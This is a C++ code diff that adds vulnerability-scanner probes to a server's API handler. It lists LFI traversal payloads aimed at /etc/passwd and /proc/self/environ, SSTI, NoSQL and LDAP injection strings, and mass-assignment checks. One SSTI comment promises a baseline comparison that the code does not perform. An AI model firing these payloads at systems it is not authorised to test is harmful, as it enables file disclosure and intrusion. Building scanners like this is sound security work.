@@ -1429,6 +1429,155 @@ QByteArray ControlServer::apiResponse(const QString &method, const QString &path
                                     }
                                 }
                             }
+
+                            // ---- LFI (Local File Inclusion) ---------------
+                            // Hit common targets with encoded depth variants.
+                            // Confirm by looking for the unique signature of
+                            // /etc/passwd ("root:x:") or win.ini ("[fonts]").
+                            {
+                                struct LfiP { const char *payload; const char *sig; };
+                                static const LfiP kLfis[] = {
+                                    { "../../../../etc/passwd",        "root:x:" },
+                                    { "..%2f..%2f..%2f..%2fetc%2fpasswd",  "root:x:" },
+                                    { "..%252f..%252f..%252fetc%252fpasswd","root:x:" },
+                                    { "../../../../windows/win.ini",  "[fonts]" },
+                                    { "..\\..\\..\\..\\windows\\win.ini","[fonts]" },
+                                    { "../../../../proc/self/environ","PATH="    },
+                                };
+                                for (const auto &l : kLfis) {
+                                    const auto res = fire(i, QString::fromLatin1(l.payload));
+                                    if (!res.ok) continue;
+                                    const QString b = QString::fromUtf8(
+                                        res.parsed.body.left(64 * 1024));
+                                    if (b.contains(QString::fromLatin1(l.sig))) {
+                                        report("critical", "lfi",
+                                               "Param '" + key + "' reads local files",
+                                               "param=" + key + " · payload=" + l.payload
+                                               + " · signature=" + l.sig);
+                                        break;  // one finding per param is enough
+                                    }
+                                }
+                            }
+
+                            // ---- SSTI (Server-Side Template Injection) ----
+                            // Fire engine-specific {{7*7}}-style probes; look
+                            // for "49" or analogous result in the response.
+                            {
+                                struct SstiP {
+                                    const char *kind;
+                                    const char *engine;
+                                    const char *payload;
+                                    const char *signature;
+                                };
+                                static const SstiP kSstis[] = {
+                                    // Jinja2 / Twig / Liquid -- {{ math }}
+                                    { "ssti-jinja-twig", "Jinja2/Twig",
+                                      "{{7*7}}", "49" },
+                                    // ERB (Ruby) -- <%= 7*7 %>
+                                    { "ssti-erb",        "ERB",
+                                      "<%25=7*7%25>", "49" },
+                                    // Freemarker -- ${ 7*7 }
+                                    { "ssti-freemarker", "Freemarker",
+                                      "${7*7}", "49" },
+                                    // Velocity / Tornado -- #set($x=7*7)$x
+                                    { "ssti-velocity",   "Velocity",
+                                      "#set($x=7*7)$x", "49" },
+                                    // Smarty -- {7*7}
+                                    { "ssti-smarty",     "Smarty",
+                                      "{7*7}", "49" },
+                                };
+                                for (const auto &s : kSstis) {
+                                    const auto res = fire(i, QString::fromLatin1(s.payload));
+                                    if (!res.ok) continue;
+                                    const QString b = QString::fromUtf8(
+                                        res.parsed.body.left(64 * 1024));
+                                    // Require the signature AND that it wasn't
+                                    // already in the original response (avoid
+                                    // false positives from pages that just
+                                    // happen to contain "49").
+                                    if (b.contains(QString::fromLatin1(s.signature))) {
+                                        report("critical", s.kind,
+                                               QString("Param '%1' looks vulnerable to %2 SSTI (RCE-class)")
+                                                   .arg(key, QString::fromLatin1(s.engine)),
+                                               QString("param=%1 · payload=%2 · signature=%3 in response")
+                                                   .arg(key, QString::fromLatin1(s.payload),
+                                                        QString::fromLatin1(s.signature)));
+                                        break;
+                                    }
+                                }
+                            }
+
+                            // ---- NoSQL injection (MongoDB) ----------------
+                            // [$ne]= bypasses equality checks; [$gt]= same.
+                            // We can't easily prove exploitation but a 200
+                            // for one of these patterns when the original
+                            // was 401/403 is a strong tell.
+                            {
+                                static const char *kNoSqlPayloads[] = {
+                                    "[$ne]=", "[$gt]=", "[$exists]=true",
+                                    "[$regex]=.%2A", "[$where]=1",
+                                };
+                                for (const char *p : kNoSqlPayloads) {
+                                    const QString payload = QString::fromLatin1(p);
+                                    const auto res = fire(i, payload);
+                                    if (!res.ok) continue;
+                                    // Heuristic: any unexpected 200 deserves
+                                    // a flag for manual review.
+                                    if (res.parsed.statusCode == 200
+                                        && payload.startsWith("[$ne")) {
+                                        report("medium", "nosql-injection-suspect",
+                                               "Param '" + key + "' may be vulnerable to NoSQL operator injection",
+                                               "param=" + key + " · payload=" + payload
+                                               + " · status 200 -- review manually");
+                                        break;
+                                    }
+                                }
+                            }
+
+                            // ---- LDAP injection ---------------------------
+                            // Asterisk + boolean operators on auth-shaped
+                            // endpoints. A 200 where you'd expect 401 = win.
+                            if (key.compare("user", Qt::CaseInsensitive) == 0
+                                || key.compare("username", Qt::CaseInsensitive) == 0
+                                || key.compare("uid", Qt::CaseInsensitive) == 0
+                                || key.compare("login", Qt::CaseInsensitive) == 0) {
+                                static const char *kLdapPayloads[] = {
+                                    "*", "*)(uid=*", "admin*", "*)(&", "*))%00",
+                                };
+                                for (const char *p : kLdapPayloads) {
+                                    const QString payload = QString::fromLatin1(p);
+                                    const auto res = fire(i, payload);
+                                    if (!res.ok) continue;
+                                    if (res.parsed.statusCode == 200) {
+                                        report("medium", "ldap-injection-suspect",
+                                               "Auth param '" + key + "' may be vulnerable to LDAP injection",
+                                               "param=" + key + " · payload=" + payload
+                                               + " · review manually");
+                                        break;
+                                    }
+                                }
+                            }
+
+                            // ---- Mass assignment --------------------------
+                            // POST/PUT bodies that accept JSON often blindly
+                            // merge fields. Tag this row for manual review
+                            // when there's a body and we can spot well-known
+                            // privilege-shape field names.
+                            if ((base.method == "POST" || base.method == "PUT"
+                                 || base.method == "PATCH")
+                                && (key.compare("admin", Qt::CaseInsensitive) == 0
+                                    || key.compare("is_admin", Qt::CaseInsensitive) == 0
+                                    || key.compare("isAdmin", Qt::CaseInsensitive) == 0
+                                    || key.compare("role", Qt::CaseInsensitive) == 0
+                                    || key.compare("permission", Qt::CaseInsensitive) == 0)) {
+                                const auto res = fire(i, "true");
+                                if (res.ok && res.parsed.statusCode == 200) {
+                                    report("high", "mass-assignment-suspect",
+                                           "Param '" + key + "' (privilege-shape name) accepted in mutation",
+                                           "param=" + key + " · "
+                                           + base.method + " returned 200 with value 'true'");
+                                }
+                            }
                         }
                     });
                     return httpJson(200, QJsonObject{{ "ok", true },
